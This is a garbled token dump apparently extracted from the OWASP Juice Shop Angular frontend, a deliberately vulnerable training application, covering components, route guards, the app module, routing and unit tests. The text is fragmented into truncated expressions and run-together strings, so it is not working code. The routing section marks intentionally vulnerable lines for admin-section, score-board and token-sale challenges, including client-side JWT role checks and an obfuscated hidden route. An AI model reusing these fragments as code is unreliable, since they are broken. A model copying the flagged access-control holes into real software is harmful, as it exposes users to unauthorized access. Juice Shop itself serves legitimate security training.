Drive/Git/juice-shop/frontend/src/app/address-select/address-select.component.spec.ts'../address/address.component''./address-select.component'MatCheckboxModule'@angular/material/checkbox''AddressSelectComponent''should store address id on calling getMessage'getMessage../address/address.component/address/address./address-select.component/address-selectimport  ... eckbox''@angul ... eckbox'@angular/material/checkboxprovide ... kBar }][{ prov ... kBar }]'should ... essage'should store address id on calling getMessage() => { ... 1)\r\n  }{\r\n     ... 1)\r\n  }compone ... sage(1)component.getMessageexpect( ... ressId)P:/My Drive/Git/juice-shop/frontend/src/app/address-select/address-select.component.ts'app-address-select''./address-select.component.html''./address-select.component.scss'selecto ... select'app-address-select./address-select.component.html./address-select.component.scssconstru ... one) {}getMess ... id\r\n  }{\r\n     ... id\r\n  }P:/My Drive/Git/juice-shop/frontend/src/app/administration/administration.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/administrationuserDataSourcedoesUserHaveAnActiveSessiondoesUse ... n(user)doesUse ... SessionshowUserDetailshowUse ... ser.id)resultsLengthUseruserDataSourceHiddenfeedbackDataSourceshowFeedbackDetailsshowFee ... UserId)feedback.UserIdtimes(f ... rating)deleteFeedbackdeleteF ... ack.id)feedback.idresultsLengthFeedbackresults ... eedbackassets/public/images/padding/19px.pngcustomer-tableheight: 700px;let row; columns: feedbackColumns;feedbackColumnslet feedbackdeleteFeedback(feedback.id)fas fa-trash-alt*ngForlet i of times(feedback.rating)showFeedbackDetails(feedback.comment, feedback.UserId)[innerHTML]Click for more information{{feedback.UserId}}user-containervisibility: hidden; height: 0px;let row; columns: userColumns; userColumnsuser_detaillet usershowUserDetail(user.id)fas fa-eyevertical-align: middleuser-tabledoesUserHaveAnActiveSession(user)fas fa-user fa-lg confirmationP:/My Drive/Git/juice-shop/frontend/src/app/administration/administration.component.spec.tsUserDetailsComponent'../user-details/user-details.component'FeedbackDetailsComponent'../feedback-details/feedback-details.component''../Services/user.service''./administration.component'MatDialog'AdministrationComponent'dialoguserService'MatDialog''find''User1''User2''Feedback1''Feedback2''should find all users via the UserService'findAllUserstoMatch/User1//User2/'should give an error if UserService fails to find all users''should find all feedbacks via FeedbackService'findAllFeedbacks/Feedback1//Feedback2/'should give an error if FeedbackService fails to find all feedbacks''should refresh all feedbacks after deletion''findAllFeedbacks''should give an error if FeedbackService fails to delete feedback''should open the UserDetailsComponent to show details''should open the FeedbackDetailsComponent to show details''Feedback''should have three columns in the user table''user''user_detail''should have four columns in the feedback table''comment''rating''remove''../use ... ponent'../user-details/user-details.component/user-details/user-details'../fee ... ponent'../feedback-details/feedback-details.component/feedback-details/feedback-detailsFeedbac ... mponent../Services/user.service/Services/user'./admi ... ponent'./administration.component'Admini ... ponent'let dialog: anydialog: anylet userService: anyuserService: anylet fee ... ce: anyfeedbackService: anydialog  ... open'])dialog. ... e(null)dialog. ... rnValuedialog.open.anddialog.openuserSer ... find'])jasmine ... find'])['find']userSer ... 2' }]))userSer ... rnValueuserService.find.anduserService.findof([{ e ... r2' }])[{ emai ... er2' }]{ email: 'User1' }email: 'User1'User1{ email: 'User2' }email: 'User2'User2feedbac ... 'del'])['find', 'del']feedbac ... 2' }]))feedbac ... rnValuefeedbac ... ind.andfeedbackService.findof([{ c ... k2' }])[{ comm ... ck2' }]{ comme ... ack1' }comment: 'Feedback1'Feedback1{ comme ... ack2' }comment: 'Feedback2'Feedback2feedbac ... (null))feedbac ... del.andfeedbackService.delof(null)[Admini ... ponent]{ provi ... ialog }provide: MatDialoguseValue: dialogprovide: UserService'should ... ervice'should find all users via the UserService() => { ... /)\r\n  }{\r\n     ... /)\r\n  }compone ... Users()compone ... llUsersexpect( ... toBe(2)expect( ... h).toBeexpect( ... length)compone ... .lengthcompone ... ce.datacompone ... aSourceexpect( ... User1/)expect( ... toMatchexpect( ... .email)compone ... ].emailcompone ... data[0]expect( ... User2/)compone ... data[1]'should ...  users'should give an error if UserService fails to find all usersuserSer ... rror'))expect( ... r).toBeexpect( ... .error)component.errorshould find all feedbacks via FeedbackServicecompone ... backs()compone ... edbacksexpect( ... back1/)expect( ... omment)compone ... commentexpect( ... back2/)'should ... dbacks'should give an error if FeedbackService fails to find all feedbacksfeedbac ... rror'))'should ... letion'should refresh all feedbacks after deletionspyOn(c ... backs')compone ... back(1)compone ... eedbackexpect( ... dbacks)expect( ... With(1)'should ... edback'should give an error if FeedbackService fails to delete feedback'should ... etails'should open the UserDetailsComponent to show detailscompone ... tail(1)compone ... rDetailexpect( ...  1 } })expect(dialog.open){ data: { id: 1 } }data: { id: 1 }{ id: 1 }should open the FeedbackDetailsComponent to show detailscompone ... ck', 1)compone ... DetailsFeedback{ data: ... : 1 } }data: { ... id: 1 }{ feedb ... id: 1 }feedback: 'Feedback''should ...  table'should have three columns in the user tableexpect( ... toBe(3)compone ... Columnsexpect( ... 'user')expect( ... ]).toBeexpect( ... mns[0])compone ... umns[0]expect( ... email')expect( ... mns[1])compone ... umns[1]expect( ... etail')expect( ... mns[2])compone ... umns[2]should have four columns in the feedback tableexpect( ... toBe(4)expect( ... mment')expect( ... ating')expect( ... emove')expect( ... mns[3])compone ... umns[3]P:/My Drive/Git/juice-shop/frontend/src/app/administration/administration.component.tsfaArchivefaEyefaHomefaUser'app-administration''./administration.component.html''./administration.component.scss''paginatorUsers'paginatorUsers'paginatorFeedb'paginatorFeedb`<span class="${'confirmation''error'}">${}</span>`numberOfTimes''lastLoginTimeSIX_HOURS_IN_SECONDSselecto ... ration'app-administration'./admi ... t.html'./administration.component.html['./adm ... .scss']'./admi ... t.scss'./administration.component.scsspublic  ... ce: anypublic  ... en: anypublic  ... etail']['user' ... etail']public  ... emove']['user' ... emove']public  ... ser = 0public  ... ack = 0@ViewCh ... Users')ViewChi ... Users')@ViewCh ... Feedb')ViewChi ... Feedb')this.findAllUsers()this.findAllUsersthis.fi ... backs()this.fi ... edbacksfindAll ... })\r\n  }this.us ... \n    })this.us ... bscribethis.us ... .find()this.us ... ce.findthis.userService(users) ... \r\n    }this.us ... = usersthis.userDataSourcethis.us ... eHiddenconst useruser.em ... span>`)this.sa ... span>`)<span class="this.do ... 'error'this.do ... n(user)this.do ... Session"></span>this.us ... Source)new Mat ... Source)this.us ... orUsersthis.us ... ginatorthis.paginatorUsersthis.re ... .lengththis.re ... gthUserusers.lengththis.error = errconsole ... .error)this.fe ... edbacksthis.fe ... aSourceconst feedbackthis.fe ... Source)this.fe ... orFeedbthis.fe ... ginatorthis.paginatorFeedbthis.re ... eedbackdeleteF ... })\r\n  }this.fe ... del(id)this.fe ... ice.delshowUse ... })\r\n  }this.di ... \n    })this.dialog.openthis.dialogdata: { ...       }showFee ... })\r\n  }times ( ... ')\r\n  }return  ... ll('\u2605')Array(n ... ll('\u2605')Array(n ... s).fillArray(numberOfTimes)'\u2605'doesUse ... S)\r\n  }{ email ... umber }email: string,lastLog ...  number{\r\n     ... S)\r\n  }const S ...  60 * 6SIX_HOU ...  60 * 660 * 60 * 660 * 60return  ... ECONDS)user.la ... ECONDS)user.lastLoginTime((Date. ... ECONDS)(Date.n ... SECONDS(Date.now() / 1000)Date.now() / 1000private ... tDialogP:/My Drive/Git/juice-shop/frontend/src/app/app.component.htmlsidenavsidenav.toggle()sidenav.togglemat-typographymat-sidenav-containerfullscreenrouter-outletapp-welcomeapp-challenge-solved-notificationapp-server-started-notificationapp-navbar(sidenavToggle)mat-sidenavP:/My Drive/Git/juice-shop/frontend/src/app/app.component.spec.tsClipboardModule'ngx-clipboard'ServerStartedNotificationComponent'./server-started-notification/server-started-notification.component'AppComponent'./app.component'NavbarComponent'./navbar/navbar.component'SidenavComponent'./sidenav/sidenav.component'WelcomeComponent'./welcome/welcome.component'ChallengeSolvedNotificationComponent'./challenge-solved-notification/challenge-solved-notification.component'MatSelectModule'@angular/material/select'MatToolbarModule'@angular/material/toolbar'MatButtonModule'@angular/material/button'MatSidenavModule'@angular/material/sidenav'MatMenuModule'@angular/material/menu'MatListModule'@angular/material/list'NoopAnimationsModuleNgMatSearchBarModule'ng-mat-search-bar''./app.guard''AppComponent''should create the app'import  ... pboard''./serv ... ponent'./server-started-notification/server-started-notification.component/server-started-notification/server-started-notificationServerS ... mponent./app.component/app'./navb ... ponent'./navbar/navbar.component/navbar/navbar'./side ... ponent'./sidenav/sidenav.component/sidenav/sidenav'./welc ... ponent'./welcome/welcome.component/welcome/welcome'./chal ... ponent'./challenge-solved-notification/challenge-solved-notification.component/challenge-solved-notification/challenge-solved-notificationChallen ... mponentimport  ... select''@angul ... select'@angular/material/selectimport  ... oolbar''@angul ... oolbar'@angular/material/toolbarimport  ... button''@angul ... button'@angular/material/buttonimport  ... idenav''@angul ... idenav'@angular/material/sidenavimport  ... l/menu''@angul ... l/menu'@angular/material/menuimport  ... l/list''@angul ... l/list'@angular/material/listimport  ... ch-bar'import  ... .guard'./app.guardguard{\r\n  le ...  }))\r\n}let app ... mponentapp: AppComponentdeclara ...       ]provide ... nGuard][Transl ... nGuard]const f ... ponent)app = f ... nstance'should ... he app'should create the appexpect(app)P:/My Drive/Git/juice-shop/frontend/src/app/app.component.tsdom'app-root''./app.component.html''./app.component.scss'setDefaultLang'en'dom.watch()dom.watchselector: 'app-root'app-root'./app. ... t.html'./app.component.html['./app ... .scss']'./app. ... t.scss'./app.component.scssconstru ... ')\r\n  }this.tr ... g('en')this.tr ... ultLangenP:/My Drive/Git/juice-shop/frontend/src/app/app.guard.spec.tsDeluxeGuard'./error-page/error-page.component''LoginGuard''should open for authenticated users''TOKEN''should close for anonymous users'toBeFalse'returns payload from decoding a valid JWT''eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'tokenDecode'John Doe'iat1516239022'returns nothing when decoding an invalid JWT''12345.abcde''returns nothing when decoding an non-existing JWT''AdminGuard'loginGuard'tokenDecode''forbidRoute''should open for admins''should close for regular customers'forbidRoute'should close for deluxe customers''should close for accountants''AccountingGuard''should open for accountants''should close for admins''DeluxeGuard''should open for deluxe customers'isDeluxe'./erro ... ponent'./error-page/error-page.component/error-page/error-pageimports ...      )][\r\n     ...      )]RouterT ...       )(guard: ... ()\r\n  }expect(guard)should open for authenticated userslocalSt ... TOKEN')TOKENexpect( ... vate())guard.canActivate()guard.canActivateshould close for anonymous userslocalSt ... oveItemexpect( ... False()expect( ... BeFalseit('ret ... \r\n  }))'return ... id JWT'returns payload from decoding a valid JWT(guard: ... })\r\n  }localSt ... ssw5c')'eyJhbG ... Qssw5c'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5ceyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQSflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5cexpect( ... \n    })expect( ... code())guard.tokenDecode()guard.tokenDecodesub: '1234567890'name: 'John Doe'John Doeiat: 1516239022returns nothing when decoding an invalid JWTlocalSt ... abcde')12345.abcdeabcde'return ... ng JWT'returns nothing when decoding an non-existing JWTlet loginGuard: anyloginGuard: anyloginGu ... oute'])jasmine ... oute'])['token ... Route']{ provi ... Guard }provide: LoginGuarduseValue: loginGuard'should ... admins'should open for adminsloginGu ... n' } })loginGu ... rnValueloginGu ... ode.andloginGu ... nDecode{ data: ... in' } }data: { ... dmin' }{ role: 'admin' }role: 'admin''should ... tomers'should close for regular customersloginGu ... r' } }){ data: ... er' } }data: { ... omer' }{ role: 'customer' }role: 'customer'expect( ... dRoute)loginGu ... idRouteshould close for deluxe customersloginGu ... e' } }){ data: ... xe' } }data: { ... luxe' }{ role: 'deluxe' }role: 'deluxe''should ... ntants'should close for accountantsloginGu ... g' } }){ data: ... ng' } }data: { ... ting' }{ role: ... ting' }role: 'accounting'should open for accountantsshould close for adminsloginGu ... code'])jasmine ... code'])['tokenDecode'][DeluxeGuard]should open for deluxe customersexpect( ... luxe())guard.isDeluxe()guard.isDeluxeP:/My Drive/Git/juice-shop/frontend/src/app/app.guard.tsCanActivatejwtDecode'jwt-decode''./roles''UNAUTHORIZED_ACCESS_ERROR''UNAUTHORIZED_PAGE_ACCESS_ERROR'skipLocationChangequeryParamspayloadtype CanActivateimport  ... decode'* as jwtDecodeimport  ... /roles'./roles/rolescanActi ...  }\r\n  }return truethis.fo ... ERROR')this.forbidRoute'UNAUTH ... _ERROR'UNAUTHORIZED_ACCESS_ERRORreturn falseforbidR ... ))\r\n  }UNAUTHORIZED_PAGE_ACCESS_ERRORthis.ng ...     }))await t ... \n    })this.ro ... \n    })['403']skipLoc ... e: truequeryPa ... error }{ error }tokenDe ... ad\r\n  }{\r\n     ... ad\r\n  }let pay ...  = nullpayload: any = nullconst t ... token')token = ... token')if (tok ... \r\n    }payload ... (token)jwtDecode(token)return payloadconstru ... ard) {}const p ... ecode()payload ... ecode()this.lo ... ecode()this.lo ... nDecodethis.loginGuardif (pay ... \r\n    }payload ... s.adminpayload?.datapayload.data.rolepayload.dataroles.adminthis.lo ... Route()this.lo ... idRouteprivate ... inGuardpayload ... ountingroles.accountingisDelux ... xe\r\n  }{\r\n     ... xe\r\n  }return  ... .deluxepayload ... .deluxeroles.deluxeP:/My Drive/Git/juice-shop/frontend/src/app/app.module.tsBrowserModuleNgModuleCUSTOM_ELEMENTS_SCHEMAHTTP_INTERCEPTORSHttpClientModuleFormsModuleRouting'./app.routing'OverlayContainer'@angular/cdk/overlay'TranslateHttpLoader'@ngx-translate/http-loader'QRCodeModule'anuglar2-qrcode'FileUploadModule'ng2-file-upload''./about/about.component''./administration/administration.component''./basket/basket.component''./login/login.component'WelcomeBannerComponent'./welcome-banner/welcome-banner.component''./search-result/search-result.component''./forgot-password/forgot-password.component''./register/register.component''./contact/contact.component''./change-password/change-password.component'ProductDetailsComponent'./product-details/product-details.component''./complaint/complaint.component''./chatbot/chatbot.component''./track-result/track-result.component''./recycle/recycle.component'QrCodeComponent'./qr-code/qr-code.component''./user-details/user-details.component''./oauth/oauth.component''./nft-unlock/nft-unlock.component''./token-sale/token-sale.component'ProductReviewEditComponent'./product-review-edit/product-review-edit.component''./two-factor-auth-enter/two-factor-auth-enter.component''./privacy-security/privacy-security.component''./Services/request.interceptor''./Services/product.service''./Services/configuration.service''./Services/administration.service''./Services/security-question.service''./Services/user.service''./Services/security-answer.service''./Services/feedback.service''./Services/captcha.service''./Services/window-ref.service''./Services/product-review.service''./Services/complaint.service''./Services/chatbot.service''./Services/track-order.service''./Services/recycle.service''./Services/basket.service''./Services/challenge.service''./Services/data-subject.service''./Services/image-captcha.service''./Services/keys.service''./Services/address.service''./Services/quantity.service'FlexLayoutModule'@angular/flex-layout'MatDatepickerModule'@angular/material/datepicker'MatNativeDateModule'@angular/material/core'MatProgressBarModule'@angular/material/progress-bar'MatButtonToggleModule'@angular/material/button-toggle'LayoutModule'@angular/cdk/layout'MatBadgeModule'@angular/material/badge'HighlightModuleHIGHLIGHT_OPTIONS'ngx-highlightjs'ScoreBoardModule'./score-board/score-board.module''./two-factor-auth/two-factor-auth.component''./data-export/data-export.component''./last-login-ip/last-login-ip.component''./privacy-policy/privacy-policy.component''./address-create/address-create.component''./address-select/address-select.component''./Services/payment.service''./payment/payment.component'PaymentMethodComponent'./payment-method/payment-method.component''./saved-payment-methods/saved-payment-methods.component''./accounting/accounting.component''./order-summary/order-summary.component'PurchaseBasketComponent'./purchase-basket/purchase-basket.component''./address/address.component''./saved-address/saved-address.component'ChallengeStatusBadgeComponent'./challenge-status-badge/challenge-status-badge.component''./order-completion/order-completion.component''./wallet/wallet.component''./Services/wallet.service''./order-history/order-history.component''./Services/order-history.service''./delivery-method/delivery-method.component''./Services/delivery.service''./photo-wall/photo-wall.component''./Services/photo-wall.service''./deluxe-user/deluxe-user.component'MatPasswordStrengthModule'@angular-material-extensions/password-strength'MatSlideToggleModule'@angular/material/slide-toggle''./feedback-details/feedback-details.component'MatSliderModule'@angular/material/slider'MatTabsModule'@angular/material/tabs'MatChipsModule'@angular/material/chips'CodeSnippetComponent'./code-snippet/code-snippet.component'CodeAreaComponent'./code-area/code-area.component'NgxTextDiffModule'ngx-text-diff'CodeFixesComponent'./code-fixes/code-fixes.component'HttpLoaderFactory'./assets/i18n/''.json'useFactorydepscoreLibraryLoader'highlight.js/lib/core'lineNumbersLoader'highlightjs-line-numbers.js''highlight.js/lib/languages/typescript''highlight.js/lib/languages/javascript''highlight.js/lib/languages/yaml'bootstrapAppModuleoverlayContainerconfgetContainerElement'-theme'CUSTOM_ ... _SCHEMAimport  ... outing'./app.routingroutingimport  ... verlay''@angul ... verlay'@angular/cdk/overlayimport  ... loader''@ngx-t ... loader'import  ... qrcode'import  ... upload''./abou ... ponent'./about/about.component/about/about./administration/administration.component/administration/administration'./bask ... ponent'./basket/basket.component/basket/basket'./logi ... ponent'./login/login.component/login/login./welcome-banner/welcome-banner.component/welcome-banner/welcome-bannerWelcome ... mponent'./sear ... ponent'./search-result/search-result.component/search-result/search-result'./forg ... ponent'./forgot-password/forgot-password.component/forgot-password/forgot-password'./regi ... ponent'./register/register.component/register/register'./cont ... ponent'./contact/contact.component/contact/contact'./chan ... ponent'./change-password/change-password.component/change-password/change-password'./prod ... ponent'./product-details/product-details.component/product-details/product-detailsProduct ... mponent'./comp ... ponent'./complaint/complaint.component/complaint/complaint'./chat ... ponent'./chatbot/chatbot.component/chatbot/chatbot'./trac ... ponent'./track-result/track-result.component/track-result/track-result'./recy ... ponent'./recycle/recycle.component/recycle/recycle'./qr-c ... ponent'./qr-code/qr-code.component/qr-code/qr-code'./user ... ponent'./user-details/user-details.component'./oaut ... ponent'./oauth/oauth.component/oauth/oauth'./nft- ... ponent'./nft-unlock/nft-unlock.component/nft-unlock/nft-unlock'./toke ... ponent'./token-sale/token-sale.component/token-sale/token-sale./product-review-edit/product-review-edit.component/product-review-edit/product-review-edit'./two- ... ponent'./two-factor-auth-enter/two-factor-auth-enter.component/two-factor-auth-enter/two-factor-auth-enter'./priv ... ponent'./privacy-security/privacy-security.component/privacy-security/privacy-securityimport  ... ceptor''./Serv ... ceptor'./Services/request.interceptor/Services/requestinterceptor'./Serv ... ervice'./Services/product.service./Services/configuration.service./Services/administration.service/Services/administration./Services/security-question.service/Services/security-question./Services/user.service./Services/security-answer.service/Services/security-answer./Services/feedback.service./Services/captcha.service/Services/captcha./Services/window-ref.service/Services/window-ref./Services/product-review.service/Services/product-review./Services/complaint.service/Services/complaint./Services/chatbot.service/Services/chatbot./Services/track-order.service/Services/track-order./Services/recycle.service/Services/recycle./Services/basket.service/Services/basket./Services/challenge.service/Services/challenge./Services/data-subject.service/Services/data-subject./Services/image-captcha.service/Services/image-captcha./Services/keys.service/Services/keys./Services/address.service./Services/quantity.serviceimport  ... layout''@angul ... layout'import  ... picker''@angul ... picker'@angular/material/datepickerimport  ... l/core''@angul ... l/core'@angular/material/coreimport  ... ss-bar''@angul ... ss-bar'@angular/material/progress-barimport  ... toggle''@angul ... toggle'@angular/material/button-toggleMatButt ... eModule@angular/cdk/layoutimport  ... /badge''@angul ... /badge'@angular/material/badgeimport  ... ightjs'import  ... module''./scor ... module'./score-board/score-board.module/score-board/score-board./two-factor-auth/two-factor-auth.component/two-factor-auth/two-factor-auth'./data ... ponent'./data-export/data-export.component/data-export/data-export'./last ... ponent'./last-login-ip/last-login-ip.component/last-login-ip/last-login-ip./privacy-policy/privacy-policy.component/privacy-policy/privacy-policy./address-create/address-create.component./address-select/address-select.component/address-select/address-select./Services/payment.service/Services/payment'./paym ... ponent'./payment/payment.component/payment/payment./payment-method/payment-method.component/payment-method/payment-methodPayment ... mponent'./save ... ponent'./saved-payment-methods/saved-payment-methods.component/saved-payment-methods/saved-payment-methods./accounting/accounting.component/accounting/accounting'./orde ... ponent'./order-summary/order-summary.component/order-summary/order-summary'./purc ... ponent'./purchase-basket/purchase-basket.component/purchase-basket/purchase-basketPurchas ... mponent./address/address.component./saved-address/saved-address.component/saved-address/saved-address./challenge-status-badge/challenge-status-badge.component/challenge-status-badge/challenge-status-badge./order-completion/order-completion.component/order-completion/order-completion'./wall ... ponent'./wallet/wallet.component/wallet/wallet./Services/wallet.service/Services/wallet./order-history/order-history.component/order-history/order-history./Services/order-history.service'./deli ... ponent'./delivery-method/delivery-method.component./Services/delivery.service/Services/delivery'./phot ... ponent'./photo-wall/photo-wall.component/photo-wall/photo-wall./Services/photo-wall.service/Services/photo-wall'./delu ... ponent'./deluxe-user/deluxe-user.component/deluxe-user/deluxe-userimport  ... rength''@angul ... rength'MatPass ... hModule@angular/material/slide-toggle'./feed ... ponent'./feedback-details/feedback-details.componentimport  ... slider''@angul ... slider'@angular/material/sliderimport  ... l/tabs''@angul ... l/tabs'@angular/material/tabsimport  ... /chips''@angul ... /chips'@angular/material/chips'./code ... ponent'./code-snippet/code-snippet.component/code-snippet/code-snippet./code-area/code-area.component/code-area/code-areaimport  ... t-diff'./code-fixes/code-fixes.component/code-fixes/code-fixesexport  ... on')\r\n}functio ... on')\r\n}{\r\n  re ... on')\r\n}return  ... .json')new Tra ... .json')./assets/i18n//assets/i18n/@NgModu ... nt]\r\n})NgModul ... nt]\r\n}){\r\n  de ... ent]\r\n}declara ... nt\r\n  ][\r\n     ... nt\r\n  ]imports ... le\r\n  ][\r\n     ... le\r\n  ]Transla ... \r\n    )useFact ... Factorydeps: [HttpClient][HttpClient]MatPass ... rRoot()MatPass ... forRoot[CUSTOM ... SCHEMA]provide ... ce\r\n  ][\r\n     ... ce\r\n  ]provide ... CEPTORSuseClas ... rceptorprovide ... OPTIONSuseValu ...       }coreLib ... /core')async ( ... /core')await i ... /core')import( ... /core')'highli ... b/core'highlight.js/lib/corehighlightjs/lib/corelineNum ... rs.js')async ( ... rs.js')await i ... rs.js')import( ... rs.js')'highli ... ers.js'highlightjs-line-numbers.jshighlightjs-line-numberslanguag ...       }typescr ... cript')async ( ... cript')await i ... cript')import( ... cript')'highli ... script'highlight.js/lib/languages/typescriptjs/lib/languages/typescriptjavascr ... cript')highlight.js/lib/languages/javascriptjs/lib/languages/javascriptyaml: a ... /yaml')async ( ... /yaml')await i ... /yaml')import( ... /yaml')'highli ... s/yaml'highlight.js/lib/languages/yamljs/lib/languages/yamlbootstr ... ponent][AppComponent]configu ... \n    })configu ... bscribeconfigu ... ation()(conf)  ... \r\n    }overlay ... theme')overlay ... ist.addoverlay ... assListoverlay ... ement()overlay ... Elementconf.ap ... -theme'conf.ap ... n.themeconf.application-themepublic  ... Servicepublic  ... ntainerP:/My Drive/Git/juice-shop/frontend/src/app/app.routing.ts vuln-code-snippet start adminSectionChallenge scoreBoardChallenge web3SandboxChallenge// vuln ... allenge vuln-code-snippet neutral-line adminSectionChallenge vuln-code-snippet vuln-line adminSectionChallenge vuln-code-snippet neutral-line scoreBoardChallenge vuln-code-snippet vuln-line scoreBoardChallenge vuln-code-snippet neutral-line web3SandboxChallenge vuln-code-snippet vuln-line web3SandboxChallenge vuln-code-snippet start tokenSaleChallenge vuln-code-snippet neutral-line tokenSaleChallenge vuln-code-snippet vuln-line tokenSaleChallenge vuln-code-snippet end adminSectionChallenge scoreBoardChallenge web3SandboxChallenge vuln-code-snippet end tokenSaleChallengeRouterModuleUrlMatchResultUrlSegment'./score-board/score-board.component''./faucet/faucet.module'FaucetModule'./wallet-web3/wallet-web3.module'WalletWeb3Module'./web3-sandbox/web3-sandbox.module'useHash'#access_token='consumedtoken118417417918218636669token21448715213983138D45MHtype Routestype UrlMatchResulttype UrlSegment'./scor ... ponent'./score-board/score-board.componentconst l ... dule\r\n}loadFau ... dule\r\n}async ( ... dule\r\n}{\r\n  co ... dule\r\n}const m ... odule')module  ... odule')await i ... odule')import( ... odule')'./fauc ... module'./faucet/faucet.module/faucet/faucetreturn  ... tModulemodule.FaucetModuleloadWeb ... dule\r\n}'./wall ... module'./wallet-web3/wallet-web3.module/wallet-web3/wallet-web3return  ... 3Modulemodule. ... 3Module'./web3 ... module'./web3-sandbox/web3-sandbox.module/web3-sandbox/web3-sandbox[\r\n  {  ... \n  }\r\n]{ // vu ... ge\r\n  }export  ... true })const R ... true })Routing ... true })RouterM ... true })RouterModule.forRoot{ useHash: true }useHash: trueexport  ... sult\r\n}functio ... sult\r\n}UrlSegment[]{\r\n  if ... sult\r\n}if (url ... lt\r\n  }url.length === 0url.length{\r\n     ... lt\r\n  }return  ... hResultnull as ... hResultconst p ... on.hrefpath =  ... on.hrefif (pat ... })\r\n  }path.in ... oken=')path.includes#access_token=return  ...  url })({ consumed: url }){ consumed: url }consumed: urlexport  ... enge\r\n}functio ... enge\r\n}{ // vu ... enge\r\n}if (url ... ge\r\n  }const p ... tring()path =  ... tring()url[0].toString()url[0].toStringurl[0]if (pat ... ge\r\n  }path.ma ... ase()))path.match(token1 ... Case())token1( ... rCase()token1( ... 3, 138)token1( ... 2, 186)(36669) ... rCase()(36669) ... werCase(36669).toString(36)(36669).toString(36669)token2( ... 3, 138)(10).to ... rCase()(10).to ... werCase(10).toString(36)(10).toString(10)const L ... l(args)L = Arr ... l(args)Array.p ... l(args)const D = L.shift()D = L.shift()L.shift()L.shiftL.rever ... oin('')L.rever ... }).joinL.rever ... e\r\n  })L.reverse().mapL.reverse()L.reversefunctio ... ge\r\n  }return  ... 45 - A)String. ... 45 - A)C - D - 45 - AC - D - 45C - Dconst T ... uments)T = Arr ... uments)const M = T.shift()M = T.shift()T.shift()T.shiftT.rever ... oin('')T.rever ... }).joinT.rever ... e\r\n  })T.reverse().mapT.reverse()T.reversereturn  ... 24 - H)String. ... 24 - H)m - M - 24 - Hm - M - 24m - MP:/My Drive/Git/juice-shop/frontend/src/app/basket/basket.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/basketgetBonusPointsgetBonu ... $event)getProductCountgetProd ... $event)productCountproductCount < 1checkout()Error: Unexpected token{'bonus': bonus}checkoutButtoncheckout-button{{"BTN_CHECKOUT" | translate}}"BTN_CHECKOUT""BTN_CH ... anslateBTN_CHECKOUTfas fa-cart-arrow-downapp-purchase-basket[allowEdit](emitTotal)getBonusPoints($event)(emitProductCount)getProductCount($event)P:/My Drive/Git/juice-shop/frontend/src/app/basket/basket.component.spec.ts'./basket.component''../purchase-basket/purchase-basket.component''../app.guard''BasketComponent'deluxeGuard'should store product count on calling getProductCount''should store bonus points on calling getBonusPoints''should store itemTotal in session storage''itemTotal'./basket.component'../pur ... ponent'../purchase-basket/purchase-basket.component../app.guardlet deluxeGuard[Basket ... ponent]provide: DeluxeGuarduseValu ... xeGuard'should ... tCount'should store product count on calling getProductCountcompone ... ount(1)compone ... ctCountexpect( ... tCount)'should ... Points'should store bonus points on calling getBonusPoints() => { ... 0)\r\n  }{\r\n     ... 0)\r\n  }compone ... 1, 10])compone ... sPoints[1, 10]expect( ... oBe(10)expect( ... .bonus)component.bonusshould store itemTotal in session storageP:/My Drive/Git/juice-shop/frontend/src/app/basket/basket.component.tsfaCartArrowDown'app-basket''./basket.component.html''./basket.component.scss''/address/select'library ... owDown)selecto ... basket'app-basket'./bask ... t.html'./basket.component.html['./bas ... .scss']'./bask ... t.scss'./basket.component.scsspublic  ... ber = 0this.ng ... ect']))async ( ... lect'])await t ... lect'])this.ro ... lect'])['/address/select']/address/selectgetProd ... al\r\n  }{\r\n     ... al\r\n  }this.pr ... = totalthis.productCountgetBonu ... 1]\r\n  }{\r\n     ... 1]\r\n  }session ... tal[0])total[0]this.bo ... otal[1]this.bonustotal[1]P:/My Drive/Git/juice-shop/frontend/src/app/challenge-solved-notification/challenge-solved-notification.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/challenge-solved-notificationnotifications; index as indexcloseNotificationcloseNo ... iftKey)$event.shiftKeyshowCtfFlagsInNotifications!showCt ... cationsshowCtf ... cationsnotification.flagcopiednotific ...  = truenotification.copied!notification.copiedshowCtfCountryDetailsInNotifications'none'showCtf ...  'none'{{notification.country.code | lowercase}}lowercasenotific ... wercasenotific ... ry.codenotification.country'flag''both'showCtf ...  'both'showCtf ...  'flag'showCtf ...  'name'container challenge-solved-toast mat-elevation-z4accent-notificationlet notification of notifications; index as index[hidden]!showCtfFlagsInNotificationsshowCtfCountryDetailsInNotifications !== 'none'icon-boxshowCtfCountryDetailsInNotifications === 'name' || showCtfCountryDetailsInNotifications === 'both'{{notification.country.name}}notific ... ry.nameshowCtfCountryDetailsInNotifications === 'name'fi fi-{{notification.country.code | lowercase}}showCtfCountryDetailsInNotifications === 'flag' || showCtfCountryDetailsInNotifications === 'both'brngxClipboard[cbContent](cbOnSuccess)notification.copied = true{{"COPY_TO_CLIPBOARD" | translate}}"COPY_TO_CLIPBOARD""COPY_T ... anslateCOPY_TO_CLIPBOARD{{"COPY_SUCCESS" | translate}}"COPY_SUCCESS""COPY_S ... anslateCOPY_SUCCESS{{notification.flag}}{{notification.message}}notification.messagecloseButtoncloseNotification(index, $event.shiftKey)P:/My Drive/Git/juice-shop/frontend/src/app/challenge-solved-notification/challenge-solved-notification.component.spec.ts'../Services/country-mapping.service''../Services/challenge.service''../Services/socket-io.service''./challenge-solved-notification.component'MockSocket'ChallengeSolvedNotificationComponent'socketIoServicemockSocket'socket''CookieService''should delete notifictions''1234''5678''should delete all notifications if the shiftKey was pressed''should add new notification''CHALLENGE_SOLVED''should store retrieved continue code as cookie for 1 